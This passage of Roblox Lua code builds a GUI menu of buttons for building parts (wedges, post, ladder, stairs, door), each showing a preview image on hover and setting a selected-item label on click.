Wedge10_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge10_Thin.BackgroundTransparency = 0.6
Wedge10_Thin.Position = UDim2.new(0, 5, 0, 3)
Wedge10_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge10_Thin.Font = Enum.Font.Fantasy
Wedge10_Thin.Text = "Wedge10 Thin (80)"
Wedge10_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge10_Thin.TextSize = 14
Wedge10_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge10_Thin"
end)

InfoText151 = Instance.new("ImageLabel")
InfoText151.Name = "ImageLabel"
InfoText151.Parent = MainFrame
InfoText151.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText151.BackgroundTransparency = 1
InfoText151.Position = UDim2.new(0, 40, 0, 200)
InfoText151.Size = UDim2.new(0, 100, 0, 100)
InfoText151.Image = "rbxassetid://3829849756"
InfoText151.Visible = false

Wedge10_Thin.MouseEnter:connect(function()
InfoText151.Visible = true
end)

Wedge10_Thin.MouseLeave:connect(function()
InfoText151.Visible = false
end)

Wedge10 = Instance.new("TextButton")
Wedge10.Name = "Wedge10"
Wedge10.Parent = BluePrint1
Wedge10.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge10.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge10.BackgroundTransparency = 0.6
Wedge10.Position = UDim2.new(0, 5, 0, 26)
Wedge10.Size = UDim2.new(0, 173, 0, 20)
Wedge10.Font = Enum.Font.Fantasy
Wedge10.Text = "Wedge10 (80)"
Wedge10.TextColor3 = Color3.new(1, 1, 1)
Wedge10.TextSize = 14
Wedge10.MouseButton1Down:connect(function()
Item.Text = "Wedge10"
end)

InfoText152 = Instance.new("ImageLabel")
InfoText152.Name = "ImageLabel"
InfoText152.Parent = MainFrame
InfoText152.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText152.BackgroundTransparency = 1
InfoText152.Position = UDim2.new(0, 40, 0, 200)
InfoText152.Size = UDim2.new(0, 100, 0, 100)
InfoText152.Image = "rbxassetid://3829855376"
InfoText152.Visible = false

Wedge10.MouseEnter:connect(function()
InfoText152.Visible = true
end)

Wedge10.MouseLeave:connect(function()
InfoText152.Visible = false
end)

Wedge9_Thin = Instance.new("TextButton")
Wedge9_Thin.Name = "Wedge9_Thin"
Wedge9_Thin.Parent = BluePrint1
Wedge9_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge9_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge9_Thin.BackgroundTransparency = 0.6
Wedge9_Thin.Position = UDim2.new(0, 5, 0, 49)
Wedge9_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge9_Thin.Font = Enum.Font.Fantasy
Wedge9_Thin.Text = "Wedge9 Thin (80)"
Wedge9_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge9_Thin.TextSize = 14
Wedge9_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge9_Thin"
end)

InfoText153 = Instance.new("ImageLabel")
InfoText153.Name = "ImageLabel"
InfoText153.Parent = MainFrame
InfoText153.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText153.BackgroundTransparency = 1
InfoText153.Position = UDim2.new(0, 40, 0, 200)
InfoText153.Size = UDim2.new(0, 100, 0, 100)
InfoText153.Image = "rbxassetid://3829859908"
InfoText153.Visible = false

Wedge9_Thin.MouseEnter:connect(function()
InfoText153.Visible = true
end)

Wedge9_Thin.MouseLeave:connect(function()
InfoText153.Visible = false
end)

Wedge9 = Instance.new("TextButton")
Wedge9.Name = "Wedge9"
Wedge9.Parent = BluePrint1
Wedge9.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge9.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge9.BackgroundTransparency = 0.6
Wedge9.Position = UDim2.new(0, 5, 0, 72)
Wedge9.Size = UDim2.new(0, 173, 0, 20)
Wedge9.Font = Enum.Font.Fantasy
Wedge9.Text = "Wedge9 (80)"
Wedge9.TextColor3 = Color3.new(1, 1, 1)
Wedge9.TextSize = 14
Wedge9.MouseButton1Down:connect(function()
Item.Text = "Wedge9"
end)

InfoText154 = Instance.new("ImageLabel")
InfoText154.Name = "ImageLabel"
InfoText154.Parent = MainFrame
InfoText154.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText154.BackgroundTransparency = 1
InfoText154.Position = UDim2.new(0, 40, 0, 200)
InfoText154.Size = UDim2.new(0, 100, 0, 100)
InfoText154.Image = "rbxassetid://3829857799"
InfoText154.Visible = false

Wedge9.MouseEnter:connect(function()
InfoText154.Visible = true
end)

Wedge9.MouseLeave:connect(function()
InfoText154.Visible = false
end)

Wedge8_Thin = Instance.new("TextButton")
Wedge8_Thin.Name = "Wedge8_Thin"
Wedge8_Thin.Parent = BluePrint1
Wedge8_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge8_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge8_Thin.BackgroundTransparency = 0.6
Wedge8_Thin.Position = UDim2.new(0, 5, 0, 95)
Wedge8_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge8_Thin.Font = Enum.Font.Fantasy
Wedge8_Thin.Text = "Wedge8_Thin (80)"
Wedge8_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge8_Thin.TextSize = 14
Wedge8_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge8_Thin"
end)

InfoText155 = Instance.new("ImageLabel")
InfoText155.Name = "ImageLabel"
InfoText155.Parent = MainFrame
InfoText155.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText155.BackgroundTransparency = 1
InfoText155.Position = UDim2.new(0, 40, 0, 200)
InfoText155.Size = UDim2.new(0, 100, 0, 100)
InfoText155.Image = "rbxassetid://3829867508"
InfoText155.Visible = false

Wedge8_Thin.MouseEnter:connect(function()
InfoText155.Visible = true
end)

Wedge8_Thin.MouseLeave:connect(function()
InfoText155.Visible = false
end)

Wedge8 = Instance.new("TextButton")
Wedge8.Name = "Wedge8"
Wedge8.Parent = BluePrint1
Wedge8.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge8.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge8.BackgroundTransparency = 0.6
Wedge8.Position = UDim2.new(0, 5, 0, 118)
Wedge8.Size = UDim2.new(0, 173, 0, 20)
Wedge8.Font = Enum.Font.Fantasy
Wedge8.Text = "Wedge8 (80)"
Wedge8.TextColor3 = Color3.new(1, 1, 1)
Wedge8.TextSize = 14
Wedge8.MouseButton1Down:connect(function()
Item.Text = "Wedge8"
end)

InfoText156 = Instance.new("ImageLabel")
InfoText156.Name = "ImageLabel"
InfoText156.Parent = MainFrame
InfoText156.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText156.BackgroundTransparency = 1
InfoText156.Position = UDim2.new(0, 40, 0, 200)
InfoText156.Size = UDim2.new(0, 100, 0, 100)
InfoText156.Image = "rbxassetid://3829870619"
InfoText156.Visible = false

Wedge8.MouseEnter:connect(function()
InfoText156.Visible = true
end)

Wedge8.MouseLeave:connect(function()
InfoText156.Visible = false
end)

Wedge7_Thin = Instance.new("TextButton")
Wedge7_Thin.Name = "Wedge7_Thin"
Wedge7_Thin.Parent = BluePrint1
Wedge7_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge7_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge7_Thin.BackgroundTransparency = 0.6
Wedge7_Thin.Position = UDim2.new(0, 5, 0, 141)
Wedge7_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge7_Thin.Font = Enum.Font.Fantasy
Wedge7_Thin.Text = "Wedge7 Thin (80)"
Wedge7_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge7_Thin.TextSize = 14
Wedge7_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge7_Thin"
end)

InfoText157 = Instance.new("ImageLabel")
InfoText157.Name = "ImageLabel"
InfoText157.Parent = MainFrame
InfoText157.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText157.BackgroundTransparency = 1
InfoText157.Position = UDim2.new(0, 40, 0, 200)
InfoText157.Size = UDim2.new(0, 100, 0, 100)
InfoText157.Image = "rbxassetid://3829874957"
InfoText157.Visible = false

Wedge7_Thin.MouseEnter:connect(function()
InfoText157.Visible = true
end)

Wedge7_Thin.MouseLeave:connect(function()
InfoText157.Visible = false
end)

Wedge7 = Instance.new("TextButton")
Wedge7.Name = "Wedge7"
Wedge7.Parent = BluePrint1
Wedge7.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge7.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge7.BackgroundTransparency = 0.6
Wedge7.Position = UDim2.new(0, 5, 0, 164)
Wedge7.Size = UDim2.new(0, 173, 0, 20)
Wedge7.Font = Enum.Font.Fantasy
Wedge7.Text = "Wedge 7 (80)"
Wedge7.TextColor3 = Color3.new(1, 1, 1)
Wedge7.TextSize = 14
Wedge7.MouseButton1Down:connect(function()
Item.Text = "Wedge7"
end)

InfoText158 = Instance.new("ImageLabel")
InfoText158.Name = "ImageLabel"
InfoText158.Parent = MainFrame
InfoText158.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText158.BackgroundTransparency = 1
InfoText158.Position = UDim2.new(0, 40, 0, 200)
InfoText158.Size = UDim2.new(0, 100, 0, 100)
InfoText158.Image = "rbxassetid://3829884935"
InfoText158.Visible = false

Wedge7.MouseEnter:connect(function()
InfoText158.Visible = true
end)

Wedge7.MouseLeave:connect(function()
InfoText158.Visible = false
end)

Wedge6_Thin = Instance.new("TextButton")
Wedge6_Thin.Name = "Wedge6_Thin"
Wedge6_Thin.Parent = BluePrint1
Wedge6_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge6_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge6_Thin.BackgroundTransparency = 0.6
Wedge6_Thin.Position = UDim2.new(0, 5, 0, 187)
Wedge6_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge6_Thin.Font = Enum.Font.Fantasy
Wedge6_Thin.Text = "Wedge6 Thin (80)"
Wedge6_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge6_Thin.TextSize = 14
Wedge6_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge6_Thin"
end)

InfoText159 = Instance.new("ImageLabel")
InfoText159.Name = "ImageLabel"
InfoText159.Parent = MainFrame
InfoText159.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText159.BackgroundTransparency = 1
InfoText159.Position = UDim2.new(0, 40, 0, 200)
InfoText159.Size = UDim2.new(0, 100, 0, 100)
InfoText159.Image = "rbxassetid://3829888185"
InfoText159.Visible = false

Wedge6_Thin.MouseEnter:connect(function()
InfoText159.Visible = true
end)

Wedge6_Thin.MouseLeave:connect(function()
InfoText159.Visible = false
end)

Wedge6 = Instance.new("TextButton")
Wedge6.Name = "Wedge6"
Wedge6.Parent = BluePrint1
Wedge6.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge6.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge6.BackgroundTransparency = 0.6
Wedge6.Position = UDim2.new(0, 5, 0, 210)
Wedge6.Size = UDim2.new(0, 173, 0, 20)
Wedge6.Font = Enum.Font.Fantasy
Wedge6.Text = "Wedge6 (80)"
Wedge6.TextColor3 = Color3.new(1, 1, 1)
Wedge6.TextSize = 14
Wedge6.MouseButton1Down:connect(function()
Item.Text = "Wedge6"
end)

InfoText160 = Instance.new("ImageLabel")
InfoText160.Name = "ImageLabel"
InfoText160.Parent = MainFrame
InfoText160.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText160.BackgroundTransparency = 1
InfoText160.Position = UDim2.new(0, 40, 0, 200)
InfoText160.Size = UDim2.new(0, 100, 0, 100)
InfoText160.Image = "rbxassetid://3829891002"
InfoText160.Visible = false

Wedge6.MouseEnter:connect(function()
InfoText160.Visible = true
end)

Wedge6.MouseLeave:connect(function()
InfoText160.Visible = false
end)

Wedge5_Thin = Instance.new("TextButton")
Wedge5_Thin.Name = "Wedge5_Thin"
Wedge5_Thin.Parent = BluePrint1
Wedge5_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge5_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge5_Thin.BackgroundTransparency = 0.6
Wedge5_Thin.Position = UDim2.new(0, 5, 0, 233)
Wedge5_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge5_Thin.Font = Enum.Font.Fantasy
Wedge5_Thin.Text = "Wedge5 Thin (80)"
Wedge5_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge5_Thin.TextSize = 14
Wedge5_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge5_Thin"
end)

InfoText161 = Instance.new("ImageLabel")
InfoText161.Name = "ImageLabel"
InfoText161.Parent = MainFrame
InfoText161.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText161.BackgroundTransparency = 1
InfoText161.Position = UDim2.new(0, 40, 0, 200)
InfoText161.Size = UDim2.new(0, 100, 0, 100)
InfoText161.Image = "rbxassetid://3829893306"
InfoText161.Visible = false

Wedge5_Thin.MouseEnter:connect(function()
InfoText161.Visible = true
end)

Wedge5_Thin.MouseLeave:connect(function()
InfoText161.Visible = false
end)

Wedge5 = Instance.new("TextButton")
Wedge5.Name = "Wedge5"
Wedge5.Parent = BluePrint1
Wedge5.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge5.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge5.BackgroundTransparency = 0.6
Wedge5.Position = UDim2.new(0, 5, 0, 256)
Wedge5.Size = UDim2.new(0, 173, 0, 20)
Wedge5.Font = Enum.Font.Fantasy
Wedge5.Text = "Wedge5 (80)"
Wedge5.TextColor3 = Color3.new(1, 1, 1)
Wedge5.TextSize = 14
Wedge5.MouseButton1Down:connect(function()
Item.Text = "Wedge5"
end)

InfoText162 = Instance.new("ImageLabel")
InfoText162.Name = "ImageLabel"
InfoText162.Parent = MainFrame
InfoText162.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText162.BackgroundTransparency = 1
InfoText162.Position = UDim2.new(0, 40, 0, 200)
InfoText162.Size = UDim2.new(0, 100, 0, 100)
InfoText162.Image = "rbxassetid://3829895050"
InfoText162.Visible = false

Wedge5.MouseEnter:connect(function()
InfoText162.Visible = true
end)

Wedge5.MouseLeave:connect(function()
InfoText162.Visible = false
end)

Wedge4_Thin = Instance.new("TextButton")
Wedge4_Thin.Name = "Wedge4_Thin"
Wedge4_Thin.Parent = BluePrint1
Wedge4_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge4_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge4_Thin.BackgroundTransparency = 0.6
Wedge4_Thin.Position = UDim2.new(0, 5, 0, 279)
Wedge4_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge4_Thin.Font = Enum.Font.Fantasy
Wedge4_Thin.Text = "Wedge4 Thin (80)"
Wedge4_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge4_Thin.TextSize = 14
Wedge4_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge4_Thin"
end)

InfoText163 = Instance.new("ImageLabel")
InfoText163.Name = "ImageLabel"
InfoText163.Parent = MainFrame
InfoText163.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText163.BackgroundTransparency = 1
InfoText163.Position = UDim2.new(0, 40, 0, 200)
InfoText163.Size = UDim2.new(0, 100, 0, 100)
InfoText163.Image = "rbxassetid://3831250719"
InfoText163.Visible = false

Wedge4_Thin.MouseEnter:connect(function()
InfoText163.Visible = true
end)

Wedge4_Thin.MouseLeave:connect(function()
InfoText163.Visible = false
end)

Wedge4 = Instance.new("TextButton")
Wedge4.Name = "Wedge4"
Wedge4.Parent = BluePrint1
Wedge4.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge4.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge4.BackgroundTransparency = 0.6
Wedge4.Position = UDim2.new(0, 5, 0, 302)
Wedge4.Size = UDim2.new(0, 173, 0, 20)
Wedge4.Font = Enum.Font.Fantasy
Wedge4.Text = "Wedge4 (80)"
Wedge4.TextColor3 = Color3.new(1, 1, 1)
Wedge4.TextSize = 14
Wedge4.MouseButton1Down:connect(function()
Item.Text = "Wedge4"
end)

InfoText164 = Instance.new("ImageLabel")
InfoText164.Name = "ImageLabel"
InfoText164.Parent = MainFrame
InfoText164.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText164.BackgroundTransparency = 1
InfoText164.Position = UDim2.new(0, 40, 0, 200)
InfoText164.Size = UDim2.new(0, 100, 0, 100)
InfoText164.Image = "rbxassetid://3829904744"
InfoText164.Visible = false

Wedge4.MouseEnter:connect(function()
InfoText164.Visible = true
end)

Wedge4.MouseLeave:connect(function()
InfoText164.Visible = false
end)

Wedge3_Thin = Instance.new("TextButton")
Wedge3_Thin.Name = "Wedge3_Thin"
Wedge3_Thin.Parent = BluePrint1
Wedge3_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge3_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge3_Thin.BackgroundTransparency = 0.6
Wedge3_Thin.Position = UDim2.new(0, 5, 0, 325)
Wedge3_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge3_Thin.Font = Enum.Font.Fantasy
Wedge3_Thin.Text = "Wedge3 Thin (80)"
Wedge3_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge3_Thin.TextSize = 14
Wedge3_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge3_Thin"
end)

InfoText165 = Instance.new("ImageLabel")
InfoText165.Name = "ImageLabel"
InfoText165.Parent = MainFrame
InfoText165.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText165.BackgroundTransparency = 1
InfoText165.Position = UDim2.new(0, 40, 0, 200)
InfoText165.Size = UDim2.new(0, 100, 0, 100)
InfoText165.Image = "rbxassetid://3829897375"
InfoText165.Visible = false

Wedge3_Thin.MouseEnter:connect(function()
InfoText165.Visible = true
end)

Wedge3_Thin.MouseLeave:connect(function()
InfoText165.Visible = false
end)

Wedge3 = Instance.new("TextButton")
Wedge3.Name = "Wedge3"
Wedge3.Parent = BluePrint1
Wedge3.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge3.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge3.BackgroundTransparency = 0.6
Wedge3.Position = UDim2.new(0, 5, 0,348)
Wedge3.Size = UDim2.new(0, 173, 0, 20)
Wedge3.Font = Enum.Font.Fantasy
Wedge3.Text = "Wedge3 (80)"
Wedge3.TextColor3 = Color3.new(1, 1, 1)
Wedge3.TextSize = 14
Wedge3.MouseButton1Down:connect(function()
Item.Text = "Wedge3"
end)

InfoText166 = Instance.new("ImageLabel")
InfoText166.Name = "ImageLabel"
InfoText166.Parent = MainFrame
InfoText166.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText166.BackgroundTransparency = 1
InfoText166.Position = UDim2.new(0, 40, 0, 200)
InfoText166.Size = UDim2.new(0, 100, 0, 100)
InfoText166.Image = "rbxassetid://3829899381"
InfoText166.Visible = false

Wedge3.MouseEnter:connect(function()
InfoText166.Visible = true
end)

Wedge3.MouseLeave:connect(function()
InfoText166.Visible = false
end)

Wedge2_Thin = Instance.new("TextButton")
Wedge2_Thin.Name = "Wedge2_Thin"
Wedge2_Thin.Parent = BluePrint1
Wedge2_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge2_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge2_Thin.BackgroundTransparency = 0.6
Wedge2_Thin.Position = UDim2.new(0, 5, 0, 371)
Wedge2_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge2_Thin.Font = Enum.Font.Fantasy
Wedge2_Thin.Text = "Wedge2 Thin (80)"
Wedge2_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge2_Thin.TextSize = 14
Wedge2_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge2_Thin"
end)

InfoText167 = Instance.new("ImageLabel")
InfoText167.Name = "ImageLabel"
InfoText167.Parent = MainFrame
InfoText167.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText167.BackgroundTransparency = 1
InfoText167.Position = UDim2.new(0, 40, 0, 200)
InfoText167.Size = UDim2.new(0, 100, 0, 100)
InfoText167.Image = "rbxassetid://3829906697"
InfoText167.Visible = false

Wedge2_Thin.MouseEnter:connect(function()
InfoText167.Visible = true
end)

Wedge2_Thin.MouseLeave:connect(function()
InfoText167.Visible = false
end)

Wedge2 = Instance.new("TextButton")
Wedge2.Name = "Wedge2"
Wedge2.Parent = BluePrint1
Wedge2.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge2.BackgroundTransparency = 0.6
Wedge2.Position = UDim2.new(0, 5, 0, 394)
Wedge2.Size = UDim2.new(0, 173, 0, 20)
Wedge2.Font = Enum.Font.Fantasy
Wedge2.Text = "Wedge2 (80)"
Wedge2.TextColor3 = Color3.new(1, 1, 1)
Wedge2.TextSize = 14
Wedge2.MouseButton1Down:connect(function()
Item.Text = "Wedge2"
end)

InfoText168 = Instance.new("ImageLabel")
InfoText168.Name = "ImageLabel"
InfoText168.Parent = MainFrame
InfoText168.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText168.BackgroundTransparency = 1
InfoText168.Position = UDim2.new(0, 40, 0, 200)
InfoText168.Size = UDim2.new(0, 100, 0, 100)
InfoText168.Image = "rbxassetid://3829905632"
InfoText168.Visible = false

Wedge2.MouseEnter:connect(function()
InfoText168.Visible = true
end)

Wedge2.MouseLeave:connect(function()
InfoText168.Visible = false
end)

Wedge1_Thin = Instance.new("TextButton")
Wedge1_Thin.Name = "Wedge1_Thin"
Wedge1_Thin.Parent = BluePrint1
Wedge1_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge1_Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge1_Thin.BackgroundTransparency = 0.6
Wedge1_Thin.Position = UDim2.new(0, 5, 0, 417)
Wedge1_Thin.Size = UDim2.new(0, 173, 0, 20)
Wedge1_Thin.Font = Enum.Font.Fantasy
Wedge1_Thin.Text = "Wedge1 Thin (80)"
Wedge1_Thin.TextColor3 = Color3.new(1, 1, 1)
Wedge1_Thin.TextSize = 14
Wedge1_Thin.MouseButton1Down:connect(function()
Item.Text = "Wedge1_Thin"
end)

InfoText169 = Instance.new("ImageLabel")
InfoText169.Name = "ImageLabel"
InfoText169.Parent = MainFrame
InfoText169.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText169.BackgroundTransparency = 1
InfoText169.Position = UDim2.new(0, 40, 0, 200)
InfoText169.Size = UDim2.new(0, 100, 0, 100)
InfoText169.Image = "rbxassetid://3829902505"
InfoText169.Visible = false

Wedge1_Thin.MouseEnter:connect(function()
InfoText169.Visible = true
end)

Wedge1_Thin.MouseLeave:connect(function()
InfoText169.Visible = false
end)

Wedge1 = Instance.new("TextButton")
Wedge1.Name = "Wedge1"
Wedge1.Parent = BluePrint1
Wedge1.BackgroundColor3 = Color3.new(0, 0, 0)
Wedge1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wedge1.BackgroundTransparency = 0.6
Wedge1.Position = UDim2.new(0, 5, 0, 440)
Wedge1.Size = UDim2.new(0, 173, 0, 20)
Wedge1.Font = Enum.Font.Fantasy
Wedge1.Text = "Wedge1 (80)"
Wedge1.TextColor3 = Color3.new(1, 1, 1)
Wedge1.TextSize = 14
Wedge1.MouseButton1Down:connect(function()
Item.Text = "Wedge1"
end)

InfoText170 = Instance.new("ImageLabel")
InfoText170.Name = "ImageLabel"
InfoText170.Parent = MainFrame
InfoText170.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText170.BackgroundTransparency = 1
InfoText170.Position = UDim2.new(0, 40, 0, 200)
InfoText170.Size = UDim2.new(0, 100, 0, 100)
InfoText170.Image = "rbxassetid://3829913182"
InfoText170.Visible = false

Wedge1.MouseEnter:connect(function()
InfoText170.Visible = true
end)

Wedge1.MouseLeave:connect(function()
InfoText170.Visible = false
end)

Post = Instance.new("TextButton")
Post.Name = "Post"
Post.Parent = BluePrint1
Post.BackgroundColor3 = Color3.new(0, 0, 0)
Post.BorderColor3 = Color3.fromRGB(151, 0, 0)
Post.BackgroundTransparency = 0.6
Post.Position = UDim2.new(0, 5, 0, 463)
Post.Size = UDim2.new(0, 173, 0, 20)
Post.Font = Enum.Font.Fantasy
Post.Text = "Post (80)"
Post.TextColor3 = Color3.new(1, 1, 1)
Post.TextSize = 14
Post.MouseButton1Down:connect(function()
Item.Text = "Post"
end)

InfoText171 = Instance.new("ImageLabel")
InfoText171.Name = "ImageLabel"
InfoText171.Parent = MainFrame
InfoText171.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText171.BackgroundTransparency = 1
InfoText171.Position = UDim2.new(0, 40, 0, 200)
InfoText171.Size = UDim2.new(0, 100, 0, 100)
InfoText171.Image = "rbxassetid://3829944886"
InfoText171.Visible = false

Post.MouseEnter:connect(function()
InfoText171.Visible = true
end)

Post.MouseLeave:connect(function()
InfoText171.Visible = false
end)

Ladder1 = Instance.new("TextButton")
Ladder1.Name = "Ladder1"
Ladder1.Parent = BluePrint1
Ladder1.BackgroundColor3 = Color3.new(0, 0, 0)
Ladder1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Ladder1.BackgroundTransparency = 0.6
Ladder1.Position = UDim2.new(0, 5, 0, 486)
Ladder1.Size = UDim2.new(0, 173, 0, 20)
Ladder1.Font = Enum.Font.Fantasy
Ladder1.Text = "Ladder (80)"
Ladder1.TextColor3 = Color3.new(1, 1, 1)
Ladder1.TextSize = 14
Ladder1.MouseButton1Down:connect(function()
Item.Text = "Ladder1"
end)

InfoText172 = Instance.new("ImageLabel")
InfoText172.Name = "ImageLabel"
InfoText172.Parent = MainFrame
InfoText172.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText172.BackgroundTransparency = 1
InfoText172.Position = UDim2.new(0, 40, 0, 200)
InfoText172.Size = UDim2.new(0, 100, 0, 100)
InfoText172.Image = "rbxassetid://3829939969"
InfoText172.Visible = false

Ladder1.MouseEnter:connect(function()
InfoText172.Visible = true
end)

Ladder1.MouseLeave:connect(function()
InfoText172.Visible = false
end)

Stair2 = Instance.new("TextButton")
Stair2.Name = "Stair2"
Stair2.Parent = BluePrint1
Stair2.BackgroundColor3 = Color3.new(0, 0, 0)
Stair2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Stair2.BackgroundTransparency = 0.6
Stair2.Position = UDim2.new(0, 5, 0, 509)
Stair2.Size = UDim2.new(0, 173, 0, 20)
Stair2.Font = Enum.Font.Fantasy
Stair2.Text = "Stair 2 (80)"
Stair2.TextColor3 = Color3.new(1, 1, 1)
Stair2.TextSize = 14
Stair2.MouseButton1Down:connect(function()
Item.Text = "Stair2"
end)

InfoText173 = Instance.new("ImageLabel")
InfoText173.Name = "ImageLabel"
InfoText173.Parent = MainFrame
InfoText173.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText173.BackgroundTransparency = 1
InfoText173.Position = UDim2.new(0, 40, 0, 200)
InfoText173.Size = UDim2.new(0, 100, 0, 100)
InfoText173.Image = "rbxassetid://3829964143"
InfoText173.Visible = false

Stair2.MouseEnter:connect(function()
InfoText173.Visible = true
end)

Stair2.MouseLeave:connect(function()
InfoText173.Visible = false
end)

Stair1= Instance.new("TextButton")
Stair1.Name = "Stair1"
Stair1.Parent = BluePrint1
Stair1.BackgroundColor3 = Color3.new(0, 0, 0)
Stair1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Stair1.BackgroundTransparency = 0.6
Stair1.Position = UDim2.new(0, 5, 0, 533)
Stair1.Size = UDim2.new(0, 173, 0, 20)
Stair1.Font = Enum.Font.Fantasy
Stair1.Text = "Stair 1 (80)"
Stair1.TextColor3 = Color3.new(1, 1, 1)
Stair1.TextSize = 14
Stair1.MouseButton1Down:connect(function()
Item.Text = "Stair1"
end)

InfoText174 = Instance.new("ImageLabel")
InfoText174.Name = "ImageLabel"
InfoText174.Parent = MainFrame
InfoText174.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText174.BackgroundTransparency = 1
InfoText174.Position = UDim2.new(0, 40, 0, 200)
InfoText174.Size = UDim2.new(0, 100, 0, 100)
InfoText174.Image = "rbxassetid://3829964661"
InfoText174.Visible = false

Stair1.MouseEnter:connect(function()
InfoText174.Visible = true
end)

Stair1.MouseLeave:connect(function()
InfoText174.Visible = false
end)

Door1 = Instance.new("TextButton")
Door1.Name = "Door1"
Door1.Parent = BluePrint1
Door1.BackgroundColor3 = Color3.new(0, 0, 0)
Door1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Door1.BackgroundTransparency = 0.6
Door1.Position = UDim2.new(0, 5, 0, 556)
Door1.Size = UDim2.new(0, 173, 0, 20)
Door1.Font = Enum.Font.Fantasy
Door1.Text = "Door (80)"
Door1.TextColor3 = Color3.new(1, 1, 1)
Door1.TextSize = 14
Door1.MouseButton1Down:connect(function()
Item.Text = "Door1"
end)

InfoText175 = Instance.new("ImageLabel")
InfoText175.Name = "ImageLabel"
InfoText175.Parent = MainFrame
InfoText175.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText175.BackgroundTransparency = 1
InfoText175.Position = UDim2.new(0, 40, 0, 200)
InfoText175.Size = UDim2.new(0, 100, 0, 100)
InfoText175.Image = "rbxassetid://3829914086"
InfoText175.Visible = false

Door1.MouseEnter:connect(function()
InfoText175.Visible = true
end)

Door1.MouseLeave:connect(function()
InfoText175.Visible = false
end)

